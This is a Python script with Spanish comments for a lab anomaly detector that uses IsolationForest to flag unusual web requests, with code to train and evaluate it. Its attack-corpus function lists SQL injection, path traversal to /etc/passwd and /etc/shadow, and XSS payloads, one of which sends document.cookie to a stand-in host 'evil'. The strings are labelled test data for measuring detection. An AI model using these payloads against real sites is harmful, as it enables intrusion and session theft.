#!/usr/bin/env python3
"""
Cerebro IA - Detector de anomalias para la Fortaleza (machine learning).
Complementa al WAF por firmas: aprende como es el trafico NORMAL y marca lo
que se SALE de lo normal, aunque no exista una firma para ese ataque.
Modelo: IsolationForest (no supervisado). Todo local, sin red.

Uso:
    python3 cerebro_ia.py            # entrena y evalua (demo)
"""
import math, re, os, random
from collections import Counter
import numpy as np
from sklearn.ensemble import IsolationForest
import joblib

RUTA_MODELO = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cerebro_ia.joblib")

def entropia(s):
    if not s:
        return 0.0
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in Counter(s).values())

def caracteristicas(texto):
    """Convierte una peticion (texto) en numeros que describen su 'forma'.
    No mira palabras clave (eso es la regex); mira la ESTRUCTURA."""
    t = texto
    n = max(len(t), 1)
    letras = [c for c in t if c.isalpha()]
    mayus = sum(1 for c in letras if c.isupper())
    especiales = sum(1 for c in t if not c.isalnum() and not c.isspace())
    digitos = sum(1 for c in t if c.isdigit())
    tokens = re.split(r"[/?&= ]", t)
    # 'palabras MAYUS' seguidas (UNION SELECT FROM...) son muy raras en trafico real
    palabras_mayus = len(re.findall(r"\b[A-Z]{2,}\b", t))
    return [
        len(t),                                   # longitud
        entropia(t),                              # entropia
        especiales / n,                           # ratio de especiales
        digitos / n,                              # ratio de digitos
        (mayus / max(len(letras), 1)),            # ratio de mayusculas
        palabras_mayus,                           # nº de palabras TODO-MAYUS
        t.count("'") + t.count('"') + t.count("`"),   # comillas
        t.count("<") + t.count(">"),              # angulos (XSS/HTML)
        t.count("(") + t.count(")"),              # parentesis
        t.count("="),                             # signos igual
        t.count("%"),                             # codificacion URL
        t.count(";") + t.count("--") + t.count("/*"),  # separadores/comentarios
        t.count(" "),                             # espacios
        max((len(x) for x in tokens), default=0), # token mas largo
        t.count(".."),                            # '..' -> path traversal
    ]

PALABRAS = ["hola", "producto", "precio", "camiseta", "zapato", "consulta", "pedido",
            "gracias", "buenas", "oferta", "talla", "color", "envio", "factura",
            "calidad", "rapido", "recomiendo", "perfecto", "tienda", "compra", "genial"]
NOMBRES = ["ana", "juan", "pedro", "lucia", "cliente", "daniel", "maria", "jose", "marta", "luis"]

def corpus_normal(n=3000):
    """Trafico realista NORMAL (incluye puntuacion legitima: parentesis, apostrofes)."""
    out = []
    for _ in range(n):
        r = random.random()
        if r < 0.25:
            out.append(random.choice(["/", "/admin", "/stream", "/logout", "/muro",
                                       "/favicon.ico", "/mapa", "/api/ataques"]))
        elif r < 0.5:
            pw = "".join(random.choices("abcdefghijkABCDEFGHJK0123456789-_!", k=random.randint(8, 16)))
            out.append(f"/login email={random.choice(NOMBRES)}@fortaleza.lab password={pw}")
        elif r < 0.78:
            msg = " ".join(random.choices(PALABRAS, k=random.randint(2, 10)))
            if random.random() < 0.2:
                msg += " (recomendado)"                      # parentesis legitimos
            if random.random() < 0.2:
                msg = random.choice(["it's great, i'll be back", "me ha encantado :)",
                                     "que bien, repetire sin duda", "100% recomendado (top)"])
            out.append(f"/muro autor={random.choice(NOMBRES)} mensaje={msg}")
        else:
            out.append("/?q=" + " ".join(random.choices(PALABRAS, k=random.randint(1, 4))))
    return out

def corpus_ataques(n=500):
    """Corpus de ATAQUES etiquetado (variado) para medir deteccion."""
    sqli = ["' OR 1=1--", "1 UNION SELECT user,pass FROM users", "admin'--",
            "1 AND SLEEP(5)", "' OR 'a'='a'--", "1); DROP TABLE users--", "1 OR 7=7",
            "' UNION SELECT NULL,NULL--", "1 AND 1=1 UNION SELECT password FROM users"]
    xss = ["<script>alert(1)</script>", "<svg onload=alert(1)>", "<img src=x onerror=alert(1)>",
           "<details open ontoggle=alert(document.cookie)>", "<body onpointerover=alert(1)>",
           "javascript:alert(document.cookie)", "\"><script>fetch('http://evil/'+document.cookie)</script>"]
    trav = ["../../../etc/passwd", "....//....//etc/shadow", "..%2f..%2fetc%2fpasswd", "/etc/passwd"]
    enc = ["1%2520UNION%2520SELECT%2520pass", "%3Cscript%3Ealert(1)%3C/script%3E", "%27%20OR%201%3D1--"]
    out = []
    for _ in range(n):
        t = random.random()
        if t < 0.35:   out.append("/?q=" + random.choice(sqli))
        elif t < 0.6:  out.append("/muro mensaje=" + random.choice(xss))
        elif t < 0.75: out.append("/?file=" + random.choice(trav))
        elif t < 0.9:  out.append("/?q=" + random.choice(enc))
        else:          out.append("/?d=" + "QWxhZGRpbjpvcGVu" * random.randint(8, 25))
    return out

Z_UMBRAL = 6.0   # nº de desviaciones para considerar una caracteristica anomala

# caracteristicas que en trafico normal son ~siempre 0; si aparecen, es novedad.
# Se EXCLUYEN parentesis, comillas y % : aparecen en texto legitimo
# ("(nota)", "it's", "100%"); ademas el %-encoding de ataques ya se decodifica
# antes de llegar a la IA. indices: 5 palabras_mayus, 7 angulos, 11 separadores, 14 '..'
PELIGROSAS = [5, 7, 11, 14]

class ModeloAnomalias:
    """Ensemble de 3 senales (anomalo si CUALQUIERA salta):
    1) Novedad de rango: una caracteristica 'peligrosa' supera lo visto en lo
       normal (p. ej. aparecen <> o comillas que nunca se ven).
    2) z-score: una caracteristica se desvia mucho de la media.
    3) IsolationForest: la 'forma' global es rara (blobs, entropia, codificacion)."""
    def __init__(self, iforest, media, desv, maximos):
        self.iforest, self.media, self.desv, self.maximos = iforest, media, desv, maximos
    def es_anomalo(self, texto):
        x = np.array(caracteristicas(texto), dtype=float)
        # 1) novedad de rango en las caracteristicas peligrosas
        for i in PELIGROSAS:
            if x[i] > self.maximos[i]:
                return True
        # 2) z-score
        if np.abs((x - self.media) / (self.desv + 1.0)).max() > Z_UMBRAL:
            return True
        # 3) forma global
        return self.iforest.predict(x.reshape(1, -1))[0] == -1

def entrenar():
    X = np.array([caracteristicas(s) for s in corpus_normal()], dtype=float)
    iforest = IsolationForest(contamination=0.01, n_estimators=300, random_state=0).fit(X)
    # Guardamos los COMPONENTES (no la clase) para que el modelo se pueda cargar
    # tanto si cerebro_ia se ejecuta como script como si se importa.
    comp = {"iforest": iforest, "media": X.mean(axis=0),
            "desv": X.std(axis=0), "maximos": X.max(axis=0)}
    joblib.dump(comp, RUTA_MODELO)
    return ModeloAnomalias(**comp)

def cargar():
    if os.path.exists(RUTA_MODELO):
        return ModeloAnomalias(**joblib.load(RUTA_MODELO))
    return entrenar()

def es_anomalo(texto, modelo=None):
    return (modelo or cargar()).es_anomalo(texto)

# ---- Evaluacion profesional (precision/recall sobre datos no vistos) ------
def _entrena_y_mide(train, test_norm, ataques):
    X = np.array([caracteristicas(s) for s in train], dtype=float)
    iforest = IsolationForest(contamination=0.01, n_estimators=300, random_state=0).fit(X)
    m = ModeloAnomalias(iforest, X.mean(axis=0), X.std(axis=0), X.max(axis=0))
    FP = sum(m.es_anomalo(s) for s in test_norm)
    TP = sum(m.es_anomalo(s) for s in ataques)
    fpr = FP / len(test_norm) if test_norm else 0
    recall = TP / len(ataques) if ataques else 0
    precision = TP / (TP + FP) if (TP + FP) else 0
    f1 = 2 * precision * recall / (precision + recall) if (precision + recall) else 0
    print(f"Entrenado con {len(train)} normales.  Evaluado con {len(test_norm)} "
          f"normales no vistos + {len(ataques)} ataques.\n")
    print(f"  Recall (deteccion de ataques) : {recall*100:5.1f}%   ({TP}/{len(ataques)})")
    print(f"  Falsos positivos (FP rate)    : {fpr*100:5.2f}%   ({FP}/{len(test_norm)})")
    print(f"  Precision                     : {precision*100:5.1f}%")
    print(f"  F1-score                      : {f1*100:5.1f}%")
    return recall, fpr

def evaluar():
    """Evaluacion con datos SINTETICOS (laboratorio)."""
    random.seed(1)
    normal = corpus_normal(3000); random.shuffle(normal)
    corte = int(len(normal) * 0.8)
    return _entrena_y_mide(normal[:corte], normal[corte:], corpus_ataques(500))

def _leer(fichero):
    # Se decodifica (unquote) para que coincida con lo que ve el modelo en
    # produccion (guardia decodifica antes de pasar la peticion a la IA).
    from urllib.parse import unquote_plus
    with open(fichero, encoding="utf-8", errors="ignore") as fh:
        return [unquote_plus(l.strip()) for l in fh if l.strip()]

def evaluar_real(f_normal, f_ataques):
    """Evaluacion con TRAFICO REAL capturado (dos ficheros: normal y ataques)."""
    normal = _leer(f_normal); ataques = _leer(f_ataques)
    if len(normal) < 20 or len(ataques) < 5:
        print("Hacen falta mas muestras (>=20 normales y >=5 ataques)."); return
    random.seed(1); random.shuffle(normal)
    corte = int(len(normal) * 0.8)
    print(f"[TRAFICO REAL]  normales={len(normal)}  ataques={len(ataques)}\n")
    return _entrena_y_mide(normal[:corte], normal[corte:], ataques)

if __name__ == "__main__":
    import sys
    if len(sys.argv) == 3:            # python3 cerebro_ia.py normal.txt ataques.txt
        evaluar_real(sys.argv[1], sys.argv[2])
    else:
        evaluar()
        entrenar()   # guarda el modelo para la app
        print("\nModelo guardado en cerebro_ia.joblib")
